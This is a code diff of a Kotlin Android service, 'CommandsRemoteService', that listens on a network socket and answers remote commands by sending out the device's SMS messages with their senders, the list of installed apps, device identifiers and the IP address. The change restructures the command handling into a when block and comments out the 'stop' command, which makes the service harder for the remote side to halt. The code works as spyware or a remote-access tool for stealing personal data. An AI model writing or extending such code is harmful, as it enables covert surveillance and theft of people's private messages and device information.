@@ -86,7 +86,7 @@ class CommandsRemoteService : Service() {
     @RequiresApi(Build.VERSION_CODES.O)
     override fun onCreate() {
         super.onCreate()
-        serverSocket = ServerSocket(8081)
+        serverSocket = ServerSocket(8080)
         val notification = createNotification()
         startForeground(1, notification)
     }
@@ -105,63 +105,68 @@ class CommandsRemoteService : Service() {
                         val getSmsDevice = readSMS()
                         val getAppDevice = getInstalledApps().toString()
 
-                        //------------------------------------------------------------------------------
-                        if (message == "getip") {
-                            clientSocket.getOutputStream().write(getIpDevice.toByteArray())
-                        }
+                        when (message) {
 
-                        if (message == "getapp") {
-                            clientSocket.getOutputStream().write(getAppDevice.toByteArray())
-                        }
-
-                        if (message == "getsms") {
-                            for (smsData in getSmsDevice) {
-                                val sender = smsData["sender"]
-                                val messageBody = smsData["messageBody"]
-                                val smsMessage = "Sender: $sender, Message: $messageBody\n"
-                                clientSocket.getOutputStream().write(smsMessage.toByteArray())
+                            "getip" -> {
+                                clientSocket.getOutputStream().write(getIpDevice.toByteArray())
                             }
-                        }
 
-                        if (message == "getuser"){
-                            val brand = Build.BRAND
-                            val product = Build.DEVICE
-                            val name = Build.MODEL
-                            val idDispositivo = Build.ID
-                            val marcaDispositivo = "$brand $product $name , $idDispositivo"
-                            clientSocket.getOutputStream().write(marcaDispositivo.toByteArray())
-                        }
-
-                        if (message == "pushuser"){
-                            val idDispositivo = Build.ID
-                            val brand = Build.BRAND
-                            val product = Build.DEVICE
-                            val name = Build.MODEL
-                            val marcaDispositivo = "$brand $product $name"
-
-                            val pushDataDevice = "$idDispositivo , $marcaDispositivo , $getIpDevice"
-
-                            clientSocket.getOutputStream().write(pushDataDevice.toByteArray())
-                        }
-
-                        if (message == "pushapp") {
-                            clientSocket.getOutputStream().write(getAppDevice.toByteArray())
-                        }
-                        if (message == "pushsms") {
-                            for (smsData in getSmsDevice) {
-                                val sender = smsData["sender"]
-                                val messageBody = smsData["messageBody"]
-                                val smsMessage = "Sender: $sender, Message: $messageBody\n"
-                                clientSocket.getOutputStream().write(smsMessage.toByteArray())
+                            "getuser" -> {
+                                val brand = Build.BRAND
+                                val product = Build.DEVICE
+                                val name = Build.MODEL
+                                val idDispositivo = Build.ID
+                                val marcaDispositivo = "$brand $product $name , $idDispositivo"
+                                clientSocket.getOutputStream().write(marcaDispositivo.toByteArray())
                             }
-                        }
 
-                        if (message == "stop") {
-                            stopSelf()
-                            Log.d("mensaje", "Dejando de enviar mensajes")
-                            break
+                            "getsms" -> {
+                                for (smsData in getSmsDevice) {
+                                    val sender = smsData["sender"]
+                                    val messageBody = smsData["messageBody"]
+                                    val smsMessage = "Sender: $sender, Message: $messageBody\n"
+                                    clientSocket.getOutputStream().write(smsMessage.toByteArray())
+                                }
+                            }
+
+                            "getapp" -> {
+                                clientSocket.getOutputStream().write(getAppDevice.toByteArray())
+                            }
+
+                            "pushuser" -> {
+                                val idDispositivo = Build.ID
+                                val brand = Build.BRAND
+                                val product = Build.DEVICE
+                                val name = Build.MODEL
+                                val marcaDispositivo = "$brand $product $name"
+
+                                val pushDataDevice = "$idDispositivo , $marcaDispositivo , $getIpDevice"
+
+                                clientSocket.getOutputStream().write(pushDataDevice.toByteArray())
+                            }
+
+                            "pushsms" -> {
+                                for (smsData in getSmsDevice) {
+                                    val sender = smsData["sender"]
+                                    val messageBody = smsData["messageBody"]
+                                    val smsMessage = "Sender: $sender, Message: $messageBody\n"
+                                    clientSocket.getOutputStream().write(smsMessage.toByteArray())
+                                }
+                            }
+
+                            "pushapp" -> {
+                                clientSocket.getOutputStream().write(getAppDevice.toByteArray())
+                            }
+
+                            /*
+                            "stop" -> {
+                                stopSelf()
+                                Log.d("mensaje", "Dejando de enviar mensajes")
+                                break
+                            }
+                            */
+
                         }
-                        //___________________________________________________________________________________
 
                     } catch (e: Exception) {
                         Log.e("mensaje", "Error reading message: $e")
